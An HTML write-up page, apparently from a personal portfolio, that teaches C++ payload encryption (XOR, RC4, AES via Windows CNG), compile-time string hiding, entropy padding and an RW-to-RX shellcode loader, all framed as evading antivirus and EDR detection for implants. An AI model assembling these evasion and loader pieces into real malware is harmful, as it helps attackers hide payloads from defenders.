@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>n0rm41 — Payload Protection Pipeline</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet"/>
+<style>
+:root {
+  --bg:       #080808;
+  --bg1:      #0d0d0d;
+  --bg2:      #111111;
+  --border:   #1e1e1e;
+  --red:      #ff2244;
+  --red-dim:  #661122;
+  --green:    #00e87a;
+  --blue:     #38b6ff;
+  --yellow:   #ffd24d;
+  --purple:   #c084fc;
+  --text:     #d8d8d8;
+  --muted:    #555;
+  --mono:     'JetBrains Mono', monospace;
+  --display:  'Syne', sans-serif;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--mono);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* scanlines */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.07) 2px,
+    rgba(0,0,0,0.07) 4px
+  );
+  pointer-events: none;
+  z-index: 9999;
+}
+
+/* noise grain */
+body::after {
+  content: '';
+  position: fixed; inset: 0;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+  pointer-events: none;
+  z-index: 9998;
+  opacity: 0.4;
+}
+
+/* NAV */
+nav {
+  position: sticky; top: 0; z-index: 100;
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 14px 40px;
+  background: rgba(8,8,8,0.92);
+  border-bottom: 1px solid var(--border);
+  backdrop-filter: blur(8px);
+}
+.nav-logo {
+  font-family: var(--display);
+  font-size: 17px; font-weight: 800;
+  letter-spacing: 1px;
+  color: #fff;
+}
+.nav-logo span { color: var(--red); }
+.nav-links { display: flex; gap: 28px; }
+.nav-links a {
+  font-size: 11px; letter-spacing: 2px; text-transform: uppercase;
+  color: var(--muted); text-decoration: none;
+  transition: color 0.2s;
+}
+.nav-links a:hover { color: var(--text); }
+
+/* HERO */
+.hero {
+  padding: 80px 40px 48px;
+  border-bottom: 1px solid var(--border);
+  max-width: 900px;
+  animation: fadeUp 0.6s ease both;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 12px;
+  margin-bottom: 20px;
+}
+.tag {
+  font-size: 9px; letter-spacing: 3px; text-transform: uppercase;
+  padding: 3px 10px; border-radius: 2px;
+  border: 1px solid;
+}
+.tag-red   { color: var(--red);    border-color: var(--red-dim); }
+.tag-green { color: var(--green);  border-color: #006633; }
+.tag-blue  { color: var(--blue);   border-color: #1a5577; }
+.tag-yellow{ color: var(--yellow); border-color: #665500; }
+.tag-purple{ color: var(--purple); border-color: #5a2d8c; }
+
+.hero-date { font-size: 11px; color: var(--muted); letter-spacing: 1px; }
+
+h1 {
+  font-family: var(--display);
+  font-size: clamp(26px, 4vw, 42px);
+  font-weight: 800;
+  line-height: 1.15;
+  letter-spacing: -0.5px;
+  color: #fff;
+  margin-bottom: 18px;
+}
+h1 em { color: var(--red); font-style: normal; }
+
+.hero-sub {
+  font-size: 13px; line-height: 1.8;
+  color: #888; max-width: 640px;
+}
+
+/* LAYOUT */
+.content {
+  display: grid;
+  grid-template-columns: 1fr 260px;
+  gap: 0;
+  max-width: 1100px;
+  margin: 0 auto;
+}
+.main-col {
+  padding: 48px 40px;
+  border-right: 1px solid var(--border);
+}
+.side-col {
+  padding: 48px 28px;
+  position: sticky; top: 57px;
+  align-self: start;
+}
+
+/* SECTIONS */
+.section {
+  margin-bottom: 56px;
+  animation: fadeUp 0.5s ease both;
+}
+.section:nth-child(1) { animation-delay: 0.1s; }
+.section:nth-child(2) { animation-delay: 0.2s; }
+.section:nth-child(3) { animation-delay: 0.3s; }
+.section:nth-child(4) { animation-delay: 0.4s; }
+.section:nth-child(5) { animation-delay: 0.5s; }
+
+.section-label {
+  font-size: 9px; letter-spacing: 4px; text-transform: uppercase;
+  color: var(--muted); margin-bottom: 20px;
+  padding-bottom: 8px; border-bottom: 1px solid var(--border);
+}
+
+h2 {
+  font-family: var(--display);
+  font-size: 20px; font-weight: 700;
+  color: #fff; margin-bottom: 14px;
+  letter-spacing: -0.3px;
+}
+h3 {
+  font-size: 13px; font-weight: 700;
+  color: var(--text); margin: 24px 0 10px;
+  letter-spacing: 1px;
+}
+
+p {
+  font-size: 13px; line-height: 1.85;
+  color: #999; margin-bottom: 14px;
+}
+p strong { color: var(--text); font-weight: 500; }
+
+/* CODE BLOCKS */
+.code-block {
+  background: var(--bg1);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  margin: 16px 0;
+  overflow: hidden;
+}
+.code-header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 8px 16px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg2);
+}
+.code-lang {
+  font-size: 9px; letter-spacing: 3px;
+  color: var(--muted); text-transform: uppercase;
+}
+.code-file {
+  font-size: 10px; color: #444;
+}
+pre {
+  padding: 16px;
+  font-size: 12px; line-height: 1.7;
+  overflow-x: auto;
+  color: #7ec8e3;
+}
+.kw  { color: #c084fc; }
+.cm  { color: #3a3a3a; font-style: italic; }
+.st  { color: #a8e6a3; }
+.nm  { color: #ffd24d; }
+.fn  { color: #38b6ff; }
+.op  { color: #ff6b6b; }
+
+/* PIPELINE DIAGRAM */
+.pipeline {
+  display: flex; align-items: center;
+  flex-wrap: wrap; gap: 0;
+  margin: 20px 0;
+  background: var(--bg1);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 20px;
+}
+.pipe-step {
+  display: flex; flex-direction: column;
+  align-items: center; gap: 4px;
+}
+.pipe-box {
+  padding: 8px 14px;
+  border-radius: 2px;
+  font-size: 11px; font-weight: 700;
+  letter-spacing: 1px; white-space: nowrap;
+}
+.pipe-arrow {
+  color: var(--muted); font-size: 16px;
+  padding: 0 6px; align-self: center;
+}
+.pipe-sub {
+  font-size: 9px; color: var(--muted);
+  letter-spacing: 1px; text-align: center;
+}
+
+/* THREAT TABLE */
+.threat-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 16px 0;
+  font-size: 12px;
+}
+.threat-table th {
+  text-align: left; padding: 8px 12px;
+  font-size: 9px; letter-spacing: 2px; color: var(--muted);
+  border-bottom: 1px solid var(--border);
+  font-weight: 400;
+}
+.threat-table td {
+  padding: 10px 12px;
+  border-bottom: 1px solid #141414;
+  vertical-align: top;
+  color: #888; line-height: 1.5;
+}
+.threat-table td:first-child { color: var(--text); }
+.threat-table tr:last-child td { border-bottom: none; }
+
+/* KEY INSIGHT BOX */
+.insight {
+  border-left: 2px solid var(--red);
+  padding: 12px 16px;
+  background: rgba(255,34,68,0.04);
+  margin: 16px 0;
+  font-size: 12px; line-height: 1.7;
+  color: #888;
+}
+.insight strong { color: var(--red); }
+
+/* SIDEBAR */
+.side-section { margin-bottom: 36px; }
+.side-label {
+  font-size: 9px; letter-spacing: 3px;
+  color: var(--muted); margin-bottom: 14px;
+  text-transform: uppercase;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 8px;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 2px; }
+.toc-list a {
+  font-size: 11px; color: var(--muted);
+  text-decoration: none; padding: 4px 0;
+  display: block; letter-spacing: 0.5px;
+  transition: color 0.2s;
+  border-left: 1px solid transparent;
+  padding-left: 10px;
+}
+.toc-list a:hover { color: var(--text); border-left-color: var(--red); }
+
+.stat-grid { display: flex; flex-direction: column; gap: 10px; }
+.stat {
+  background: var(--bg1); border: 1px solid var(--border);
+  border-radius: 2px; padding: 10px 14px;
+}
+.stat-val {
+  font-size: 20px; font-weight: 700;
+  color: #fff; line-height: 1;
+}
+.stat-key {
+  font-size: 9px; letter-spacing: 2px;
+  color: var(--muted); margin-top: 3px;
+}
+
+.skill-list { display: flex; flex-direction: column; gap: 6px; }
+.skill-item {
+  display: flex; align-items: center; gap: 8px;
+  font-size: 11px; color: #666;
+}
+.skill-dot {
+  width: 5px; height: 5px; border-radius: 50%;
+  flex-shrink: 0;
+}
+
+/* BACK LINK */
+.back-link {
+  display: inline-flex; align-items: center; gap: 8px;
+  font-size: 11px; letter-spacing: 2px;
+  color: var(--muted); text-decoration: none;
+  margin: 0 40px 0;
+  padding: 20px 0;
+  border-bottom: 1px solid var(--border);
+  width: calc(100% - 80px);
+  transition: color 0.2s;
+}
+.back-link:hover { color: var(--text); }
+
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(12px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+@media (max-width: 768px) {
+  .content { grid-template-columns: 1fr; }
+  .side-col { display: none; }
+  nav { padding: 14px 20px; }
+  .hero, .main-col { padding-left: 20px; padding-right: 20px; }
+  .back-link { margin: 0 20px; width: calc(100% - 40px); }
+}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-logo">n0rm<span>41</span></div>
+  <div class="nav-links">
+    <a href="index.html">home</a>
+    <a href="index.html#projects">projects</a>
+    <a href="index.html#writeups">writeups</a>
+  </div>
+</nav>
+
+<a class="back-link" href="index.html#writeups">← back to writeups</a>
+
+<div style="max-width:900px">
+  <div class="hero">
+    <div class="hero-meta">
+      <span class="tag tag-red">exploit dev</span>
+      <span class="tag tag-green">cryptography</span>
+      <span class="tag tag-blue">c++</span>
+      <span class="tag tag-yellow">windows</span>
+      <span class="hero-date">2025</span>
+    </div>
+    <h1>Payload Protection Pipeline:<br/><em>XOR → RC4 → AES → Entropy</em></h1>
+    <p class="hero-sub">
+      Building a layered payload encryption and obfuscation system in C++ from scratch — covering rolling XOR, RC4 stream cipher internals, AES-CBC via Windows CNG, compile-time string encryption, and entropy evasion.
+    </p>
+  </div>
+</div>
+
+<div class="content">
+<div class="main-col">
+
+  <!-- PROBLEM -->
+  <div class="section" id="problem">
+    <div class="section-label">01 — Problem</div>
+    <h2>Why Plaintext Payloads Get Caught</h2>
+    <p>
+      A compiled binary carrying a raw payload is trivially fingerprintable. Static analysis tools — from <strong>strings(1)</strong> to YARA scanners — scan the <code>.rdata</code> and <code>.text</code> sections for recognizable byte sequences. API names, URLs, and high-entropy shellcode blocks are all immediate indicators.
+    </p>
+    <p>
+      Beyond signatures, AV engines measure section entropy. AES-encrypted data has an entropy of ~7.99 bits/byte — near theoretical maximum — which is itself a heuristic flag even when the bytes are unrecognizable.
+    </p>
+    <div class="insight">
+      <strong>Core problem:</strong> The payload must be unrecognizable at rest, only materializing in memory at the exact moment of execution, and only surviving there long enough to run.
+    </div>
+  </div>
+
+  <!-- PIPELINE OVERVIEW -->
+  <div class="section" id="pipeline">
+    <div class="section-label">02 — Architecture</div>
+    <h2>The Full Pipeline</h2>
+    <p>Each layer addresses a distinct detection surface:</p>
+
+    <div class="pipeline">
+      <div class="pipe-step">
+        <div class="pipe-box" style="background:#1a0a0a;color:var(--red);border:1px solid var(--red-dim)">PLAINTEXT</div>
+        <div class="pipe-sub">raw payload</div>
+      </div>
+      <div class="pipe-arrow">→</div>
+      <div class="pipe-step">
+        <div class="pipe-box" style="background:#0a1a0a;color:var(--green);border:1px solid #006633">PKCS7 PAD</div>
+        <div class="pipe-sub">block align</div>
+      </div>
+      <div class="pipe-arrow">→</div>
+      <div class="pipe-step">
+        <div class="pipe-box" style="background:#0a0f1a;color:var(--blue);border:1px solid #1a4466">AES-CBC</div>
+        <div class="pipe-sub">encrypt</div>
+      </div>
+      <div class="pipe-arrow">→</div>
+      <div class="pipe-step">
+        <div class="pipe-box" style="background:#1a1400;color:var(--yellow);border:1px solid #443300">ENTROPY PAD</div>
+        <div class="pipe-sub">null dilution</div>
+      </div>
+      <div class="pipe-arrow">→</div>
+      <div class="pipe-step">
+        <div class="pipe-box" style="background:#110a1a;color:var(--purple);border:1px solid #4a1a77">BINARY</div>
+        <div class="pipe-sub">at rest</div>
+      </div>
+    </div>
+
+    <table class="threat-table">
+      <tr>
+        <th>Layer</th><th>Threat Mitigated</th><th>Mechanism</th>
+      </tr>
+      <tr><td>Rolling XOR</td><td>Plaintext byte patterns</td><td>Key repeats over data, multi-byte</td></tr>
+      <tr><td>RC4</td><td>Frequency analysis</td><td>Pseudorandom keystream from KSA/PRGA</td></tr>
+      <tr><td>AES-CBC</td><td>Known-plaintext, block patterns</td><td>CBC chaining, IV randomization</td></tr>
+      <tr><td>PKCS7</td><td>Block boundary leakage</td><td>Deterministic padding scheme</td></tr>
+      <tr><td>Entropy pad</td><td>High-entropy heuristics</td><td>Null byte dilution lowers average entropy</td></tr>
+      <tr><td>Compile-time encryption</td><td>Static string scanning</td><td>constexpr XOR, plaintext never in binary</td></tr>
+      <tr><td>RW→RX pattern</td><td>EDR memory heuristics</td><td>Avoid PAGE_EXECUTE_READWRITE</td></tr>
+    </table>
+  </div>
+
+  <!-- XOR -->
+  <div class="section" id="xor">
+    <div class="section-label">03 — Implementation</div>
+    <h2>Layer 1: Rolling XOR</h2>
+    <p>
+      XOR is self-inverse: <code>encrypt == decrypt</code>. The same function handles both directions. Single-byte XOR is broken by frequency analysis — the multi-byte rolling key prevents that by cycling a longer key pattern across the data.
+    </p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">C++</span>
+        <span class="code-file">xor.cpp</span>
+      </div>
+<pre><span class="kw">void</span> <span class="fn">xor_crypt</span>(std::vector&lt;uint8_t&gt;&amp; data,
+              <span class="kw">const</span> std::vector&lt;uint8_t&gt;&amp; key) {
+    <span class="kw">for</span> (size_t i = <span class="nm">0</span>; i &lt; data.size(); i++)
+        data[i] ^= key[i % key.size()];
+    <span class="cm">// encrypt and decrypt are identical — XOR is its own inverse</span>
+}</pre>
+    </div>
+    <div class="insight">
+      <strong>Key property:</strong> If you have any two of {plaintext, ciphertext, key}, you can recover the third. This is why key reuse is fatal — never encrypt two messages with the same keystream.
+    </div>
+
+    <h2 style="margin-top:40px">Layer 2: RC4 Stream Cipher</h2>
+    <p>
+      RC4 generates a pseudorandom keystream from a short key via two phases. The KSA builds a key-dependent permutation of 0–255. The PRGA walks that permutation to emit keystream bytes, which are XOR'd into the data.
+    </p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">C++</span>
+        <span class="code-file">rc4.cpp</span>
+      </div>
+<pre><span class="kw">class</span> <span class="fn">RC4</span> {
+    uint8_t S[<span class="nm">256</span>];
+    uint8_t i = <span class="nm">0</span>, j = <span class="nm">0</span>;
+<span class="kw">public</span>:
+    RC4(<span class="kw">const</span> std::vector&lt;uint8_t&gt;&amp; key) {
+        <span class="cm">// KSA — key-dependent permutation of S[256]</span>
+        <span class="kw">for</span> (<span class="kw">int</span> i = <span class="nm">0</span>; i &lt; <span class="nm">256</span>; i++) S[i] = i;
+        <span class="kw">int</span> j = <span class="nm">0</span>;
+        <span class="kw">for</span> (<span class="kw">int</span> i = <span class="nm">0</span>; i &lt; <span class="nm">256</span>; i++) {
+            j = (j + S[i] + key[i % key.size()]) % <span class="nm">256</span>;
+            std::swap(S[i], S[j]);
+        }
+    }
+    <span class="kw">void</span> <span class="fn">process</span>(std::vector&lt;uint8_t&gt;&amp; data) {
+        <span class="cm">// PRGA — emit keystream, XOR into data</span>
+        <span class="kw">for</span> (<span class="kw">auto</span>&amp; byte : data) {
+            i = (i + <span class="nm">1</span>) % <span class="nm">256</span>;
+            j = (j + S[i]) % <span class="nm">256</span>;
+            std::swap(S[i], S[j]);
+            byte ^= S[(S[i] + S[j]) % <span class="nm">256</span>];
+        }
+    }
+};</pre>
+    </div>
+
+    <h2 style="margin-top:40px">Layer 3: AES-CBC via Windows CNG</h2>
+    <p>
+      AES-CBC is the production standard. Windows CNG (<code>bcrypt.h</code>) provides AES with no external dependencies — ideal for implants. CBC mode chains each block to the previous ciphertext block, eliminating the pattern leakage of ECB.
+    </p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">C++</span>
+        <span class="code-file">aes_cng.cpp</span>
+      </div>
+<pre>std::vector&lt;uint8_t&gt; <span class="fn">aes_encrypt</span>(
+    <span class="kw">const</span> std::vector&lt;uint8_t&gt;&amp; plaintext,
+    <span class="kw">const</span> uint8_t key[<span class="nm">16</span>], <span class="kw">const</span> uint8_t iv[<span class="nm">16</span>])
+{
+    uint8_t iv_copy[<span class="nm">16</span>];
+    memcpy(iv_copy, iv, <span class="nm">16</span>); <span class="cm">// CNG mutates IV in-place — always copy</span>
+
+    BCRYPT_ALG_HANDLE hAlg = <span class="kw">nullptr</span>;
+    BCryptOpenAlgorithmProvider(&amp;hAlg, BCRYPT_AES_ALGORITHM, <span class="kw">nullptr</span>, <span class="nm">0</span>);
+    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
+        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, <span class="kw">sizeof</span>(BCRYPT_CHAIN_MODE_CBC), <span class="nm">0</span>);
+
+    BCRYPT_KEY_HANDLE hKey = <span class="kw">nullptr</span>;
+    BCryptGenerateSymmetricKey(hAlg, &amp;hKey, <span class="kw">nullptr</span>, <span class="nm">0</span>, (PUCHAR)key, <span class="nm">16</span>, <span class="nm">0</span>);
+
+    ULONG cbResult = <span class="nm">0</span>;
+    <span class="cm">// First call: get required output size</span>
+    BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), plaintext.size(),
+        <span class="kw">nullptr</span>, iv_copy, <span class="nm">16</span>, <span class="kw">nullptr</span>, <span class="nm">0</span>, &amp;cbResult, BCRYPT_BLOCK_PADDING);
+
+    std::vector&lt;uint8_t&gt; out(cbResult);
+    BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), plaintext.size(),
+        <span class="kw">nullptr</span>, iv_copy, <span class="nm">16</span>, out.data(), cbResult, &amp;cbResult, BCRYPT_BLOCK_PADDING);
+
+    BCryptDestroyKey(hKey);
+    BCryptCloseAlgorithmProvider(hAlg, <span class="nm">0</span>);
+    <span class="kw">return</span> out;
+}</pre>
+    </div>
+  </div>
+
+  <!-- COMPILE TIME -->
+  <div class="section" id="compiletime">
+    <div class="section-label">04 — Obfuscation</div>
+    <h2>Compile-Time String Encryption</h2>
+    <p>
+      String literals in C++ land in <code>.rdata</code> as plaintext. <code>strings malware.exe</code> immediately reveals all API names, URLs, and keys. The fix: encrypt at compile time using <code>constexpr</code> — the plaintext never exists in the binary.
+    </p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">C++</span>
+        <span class="code-file">cryptstr.cpp</span>
+      </div>
+<pre><span class="kw">template</span>&lt;size_t N&gt;
+<span class="kw">struct</span> <span class="fn">CryptStr</span> {
+    <span class="kw">char</span> data[N] = {};
+
+    <span class="cm">// Runs in the COMPILER — result baked into binary encrypted</span>
+    <span class="kw">constexpr</span> <span class="fn">CryptStr</span>(<span class="kw">const char</span> (&amp;s)[N], <span class="kw">char</span> key) {
+        <span class="kw">for</span> (size_t i = <span class="nm">0</span>; i &lt; N; i++)
+            data[i] = s[i] ^ key;
+    }
+
+    <span class="cm">// Runs at RUNTIME — decrypts onto stack, gone after scope</span>
+    <span class="kw">void</span> <span class="fn">decrypt</span>(<span class="kw">char</span>* out, <span class="kw">char</span> key) <span class="kw">const</span> {
+        <span class="kw">for</span> (size_t i = <span class="nm">0</span>; i &lt; N; i++)
+            out[i] = data[i] ^ key;
+    }
+};
+
+<span class="kw">constexpr char</span> KEY = <span class="nm">0x5A</span>;
+<span class="op">#define</span> HIDE(s) CryptStr&lt;<span class="kw">sizeof</span>(s)&gt;(s, KEY)
+
+<span class="cm">// Usage — "kernel32.dll" never appears in .rdata:</span>
+<span class="kw">constexpr auto</span> enc = <span class="fn">HIDE</span>(<span class="st">"kernel32.dll"</span>);
+<span class="kw">char</span> lib[<span class="nm">13</span>]; enc.decrypt(lib, KEY);
+HMODULE h = <span class="fn">LoadLibraryA</span>(lib); <span class="cm">// lib gone after scope</span></pre>
+    </div>
+    <div class="insight">
+      <strong>Why constexpr works:</strong> <code>const char (&amp;s)[N]</code> is a reference to a fixed-size array — the compiler deduces <code>N</code> automatically from the string literal, enabling compile-time iteration over every byte.
+    </div>
+  </div>
+
+  <!-- LOADER -->
+  <div class="section" id="loader">
+    <div class="section-label">05 — Execution</div>
+    <h2>Runtime Loader: RW → RX Pattern</h2>
+    <p>
+      Allocating <code>PAGE_EXECUTE_READWRITE</code> directly is a loud EDR trigger — legitimate programs almost never need writable and executable memory simultaneously. The correct pattern: allocate RW, copy in decrypted payload, then flip to RX with <code>VirtualProtect</code>.
+    </p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">C++</span>
+        <span class="code-file">loader.cpp</span>
+      </div>
+<pre><span class="kw">void</span> <span class="fn">execute_payload</span>(std::vector&lt;uint8_t&gt;&amp; shellcode) {
+    <span class="cm">// Step 1: allocate RW — not executable yet</span>
+    LPVOID mem = <span class="fn">VirtualAlloc</span>(<span class="kw">nullptr</span>, shellcode.size(),
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    memcpy(mem, shellcode.data(), shellcode.size());
+
+    <span class="cm">// Step 2: flip to RX — write permission removed</span>
+    DWORD oldProtect = <span class="nm">0</span>;
+    <span class="fn">VirtualProtect</span>(mem, shellcode.size(),
+        PAGE_EXECUTE_READ, &amp;oldProtect);
+
+    <span class="cm">// Step 3: cast to function pointer and execute</span>
+    <span class="kw">void</span> (*fn)() = (<span class="kw">void</span>(*)())mem;
+    fn();
+}</pre>
+    </div>
+  </div>
+
+  <!-- LESSONS -->
+  <div class="section" id="lessons">
+    <div class="section-label">06 — Key Lessons</div>
+    <h2>What This Taught Me</h2>
+
+    <h3>XOR IS the foundation</h3>
+    <p>Every cipher covered here — RC4, AES-CTR, compile-time encryption — reduces to XOR at the byte level. Owning XOR properties (self-inverse, key recovery from any two of three values) is non-negotiable before touching anything else.</p>
+
+    <h3>Never reuse a keystream</h3>
+    <p>The two-time pad attack eliminates the key entirely: <code>C1 ^ C2 = P1 ^ P2</code>. This broke WEP. It breaks any stream cipher with key reuse. RC4 objects must be reinitialized per operation.</p>
+
+    <h3>CNG over OpenSSL for implants</h3>
+    <p>Windows CNG is built into the OS — zero external dependencies, smaller binary footprint, and no OpenSSL import artifacts for AV to flag. The two-call pattern (size query then encrypt) is the correct usage.</p>
+
+    <h3>Entropy is a detection surface</h3>
+    <p>AES ciphertext entropy (~7.99 bits/byte) is itself a heuristic flag. Null-byte padding, base64 encoding after encryption, or storing payloads in resource sections rather than <code>.text</code> all reduce measured entropy without compromising the encryption.</p>
+
+    <h3>Compile-time ≠ security, but it buys time</h3>
+    <p><code>constexpr</code> string encryption defeats static string scanners and <code>strings(1)</code>. It does not defeat a determined reverse engineer with a debugger. It raises the cost of analysis — which is the real goal against automated tooling.</p>
+  </div>
+
+</div>
+
+<!-- SIDEBAR -->
+<div class="side-col">
+  <div class="side-section">
+    <div class="side-label">Contents</div>
+    <ul class="toc-list">
+      <li><a href="#problem">01 — Problem</a></li>
+      <li><a href="#pipeline">02 — Architecture</a></li>
+      <li><a href="#xor">03 — Implementation</a></li>
+      <li><a href="#compiletime">04 — Obfuscation</a></li>
+      <li><a href="#loader">05 — Execution</a></li>
+      <li><a href="#lessons">06 — Key Lessons</a></li>
+    </ul>
+  </div>
+
+  <div class="side-section">
+    <div class="side-label">Stats</div>
+    <div class="stat-grid">
+      <div class="stat">
+        <div class="stat-val">7</div>
+        <div class="stat-key">EXERCISES COMPLETED</div>
+      </div>
+      <div class="stat">
+        <div class="stat-val">~300</div>
+        <div class="stat-key">LINES WRITTEN</div>
+      </div>
+      <div class="stat">
+        <div class="stat-val">0</div>
+        <div class="stat-key">EXTERNAL DEPS (LOADER)</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="side-section">
+    <div class="side-label">Stack</div>
+    <div class="skill-list">
+      <div class="skill-item"><div class="skill-dot" style="background:var(--blue)"></div>C++17</div>
+      <div class="skill-item"><div class="skill-dot" style="background:var(--yellow)"></div>Windows CNG (bcrypt.h)</div>
+      <div class="skill-item"><div class="skill-dot" style="background:var(--green)"></div>MinGW cross-compile</div>
+      <div class="skill-item"><div class="skill-dot" style="background:var(--purple)"></div>constexpr metaprogramming</div>
+      <div class="skill-item"><div class="skill-dot" style="background:var(--red)"></div>VirtualAlloc / VirtualProtect</div>
+    </div>
+  </div>
+
+  <div class="side-section">
+    <div class="side-label">Tags</div>
+    <div style="display:flex;flex-wrap:wrap;gap:6px">
+      <span class="tag tag-red">cryptography</span>
+      <span class="tag tag-blue">c++</span>
+      <span class="tag tag-green">rc4</span>
+      <span class="tag tag-yellow">aes</span>
+      <span class="tag tag-purple">obfuscation</span>
+      <span class="tag tag-blue">windows</span>
+      <span class="tag tag-red">loader</span>
+    </div>
+  </div>
+</div>
+</div>
+
+</body>
+</html>
